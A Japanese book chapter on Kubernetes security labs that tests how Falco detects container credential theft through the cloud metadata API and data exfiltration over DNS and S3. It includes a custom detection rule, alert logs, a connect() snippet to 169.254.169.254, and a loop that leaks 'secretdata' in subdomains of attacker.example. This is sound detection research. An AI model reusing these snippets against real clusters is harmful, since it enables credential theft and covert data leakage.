---
title: "第9章：Credential AccessとExfiltration"
---

# 第9章：Credential AccessとExfiltration

## この章で学ぶこと

- クラスタ内で認証情報が狙われる経路と、クラウドAPIへの越境
- Lab 16〜17の実験手順とFalco・クラウドAudit Trailそれぞれの結果（実機検証）
- 「クラスタの境界」を越えた瞬間、観測の主役がどう入れ替わるか

本章ではMITRE ATT&CK for Containersの**Credential Access**と**Exfiltration**を扱います。第1章で触れた3つ目の境界線——**クラウドAPI層**が、ここで初めて主役になります。

---

## Lab 16: クラウドメタデータAPI経由のクレデンシャル窃取

- **MITRE ATT&CK for Containers**: T1552.005 (Cloud Instance Metadata API)

### 環境上の重大な制約：ローカルkindラボには本物のメタデータAPIが無い

本ラボはDocker Desktop上のkindクラスタであり、実際のAWS/GCPのVM上で動いているわけではありません。そのため、**`169.254.169.254`への接続は実際にはタイムアウトします**：

```python
s.connect(('169.254.169.254', 80))  # → timed out
```

本Labで実証できるのは「**攻撃者がこのIPへの接続を試みたという事実をFalcoが検知できるか**」までであり、「実際にクラウドの一時認証情報が取得できるか」は検証対象外です（検証するには実クラウドVM上のラボが必要）。

### 実機検証で判明した訂正：標準ルールにメタデータAPI検知は存在しない

当初「Falcoの標準ルールセットには、メタデータAPIの固定IPへの接続に反応するルールがクラウド向けに用意されている」と書いていたが、**実際には存在しなかった**。`grep -i "169.254.169.254\|metadata"`でヒットしたのは、GKEの`gke-metadata-server`という**許可イメージ名のリスト**（信頼済みコンポーネントとして除外する側の用途）のみ。

### カスタムルールでの検知（実機確認済み）

```yaml
- rule: Contact Cloud Metadata Service From Container
  condition: >
    evt.type=connect and evt.dir=< and (fd.typechar=4 or fd.typechar=6)
    and fd.sip="169.254.169.254"
```

接続が（応答が無くても）**試みられた時点**で検知できた：

```
Critical Contact cloud metadata service from container (command=python3
  connection=10.244.2.3:45604->169.254.169.254:80
  container=app pod=vulnerable-webapp-... ns=lab)
```

`connect()`システムコールの発行自体を見ているため、相手が応答するかどうかに関わらず検知できる。

**考察**: 「標準ルールに用意されている」という記述は削除し、「標準ルールには存在せず、カスタムルールが必須」に訂正する。ローカルラボでの検証には実クラウド環境特有の制約があることを明記し、「このLabは接続試行の検知までの実証であり、認証情報の実取得は別途実クラウドでの検証が必要」と誠実に書く。

## Lab 17: データの持ち出し経路（DNS exfil, S3等）

- **MITRE ATT&CK for Containers**: T1041, T1048

### 本書で最も重要な発見：DNS exfiltrationはFalcoの構造上、原理的に検知できない

当初「短時間に大量の一意なサブドメインへのクエリが異常として浮かび上がる」という標準ルール「Excessive DNS Queries」を想定していたが、これは**標準ルールに存在しないだけでなく、原理的にFalcoのsyscall監視では実現不可能**であることが実機で判明した。

```python
for i in range(60):
    socket.gethostbyname(f'{i:04x}secretdata.attacker.example')
```

デバッグ用ルールでsyscallを直接確認したところ、**60回すべてのDNSクエリが、宛先`10.96.0.10:53`（クラスタ内部のCoreDNS）への全く同一のUDP接続として記録されていた**：

```
fd.name=10.244.2.30:56651->10.96.0.10:53  （以下59回、宛先は常に同一）
```

これは、`google.com`を引く正規のDNSルックアップも、`4a6fsecretdata.attacker.example`を引く悪性のDNS exfiltrationも、**コンテナ側のsyscallレベルでは文字どおり区別がつかない**ことを意味する。**実際に流出させているデータ（サブドメイン名）はDNSパケットのペイロード内にあり、Falcoのsyscallフックはパケット内容までは見ていない**。

検知するには、CNIのパケットキャプチャ（tcpdump/flow log）か、**CoreDNS自体のクエリログ**——本書がこれまで挙げていた4つのデータソース（Falco・Audit Logs・ネットワーク観測・クラウドAudit Trail）のどれとも異なる**5つ目のデータソース**——が必要になる。

### S3持ち出しの検証：本物のAWS接続は無いが、興味深い副産物

実際のAWS認証情報が無いため`aws s3 cp`はエラーで終わるが、**`aws` CLIツール自体が、認証情報が見つからない場合に自動的にEC2インスタンスメタデータAPIへフォールバックしようとする**挙動を実機で観測できた：

```
Critical Contact cloud metadata service from container (command=aws
  connection=10.244.2.3:53072->169.254.169.254:80 ...)
```

これはLab 16で作ったカスタムルールが、意図せず自然に発火した例——**awsコマンドを実行するだけで、Lab 16の攻撃パターンが副次的に再現される**という、クラウドSDKの標準的な認証チェーンの挙動を体現する結果だった。一方、本文の「AWS CLI Executed in Container」という標準ルールは存在せず、`grep -i aws`でヒットしたのは特定のnginxログ転送パターンを除外する例外条件と、`Find AWS Credentials`（認証情報ファイルの探索を検知するルールで、s3 cp実行そのものとは別物）のみだった。

**考察**: DNS exfiltrationのくだりは全面的に書き直しが必要。「標準ルールでは検知できないが、カスタムルールなら検知できる」ではなく、**「Falcoのアーキテクチャそのものがこの種の検知に向いていない」**という、より根本的な限界として記述する。

---

## 本章のまとめ

| Lab | 手法 | 標準ルールで検知 | カスタムルールで検知 | ポイント |
|---|---|---|---|---|
| 16 | メタデータAPI経由のクレデンシャル窃取 | ❌ | ✅（接続試行まで） | 実クラウド環境なしの制約あり |
| 17（S3） | S3持ち出し | ❌ | △（副次的にLab16のルールが反応） | 実AWS環境が必要、awsの認証フォールバックが興味深い副産物 |
| 17（DNS） | DNS exfiltration | ❌ | ❌（原理的に不可能） | syscallレベルでは正規/悪性が区別不能、5つ目のデータソースが必要 |

第4章から本章まで、8フェーズ・17本の実験を通して、**本文執筆時の想定を上回る数・深さの訂正**が必要になりました。残り3本の実験（Lab 18〜20）と、これまでの結果の横断分析は次章で行います。

## 参考資料

- [MITRE ATT&CK T1552.005: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
- [MITRE ATT&CK T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [AWS: Configuring the instance metadata service（IMDSv2）](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [GKE: Workload Identity（公式ドキュメント）](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [AWS CloudTrail User Guide](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html)
- [k8s-attack-runtime-security-lab（本書の実験コード一式）](https://github.com/keitahigaki-prog/k8s-attack-runtime-security-lab)
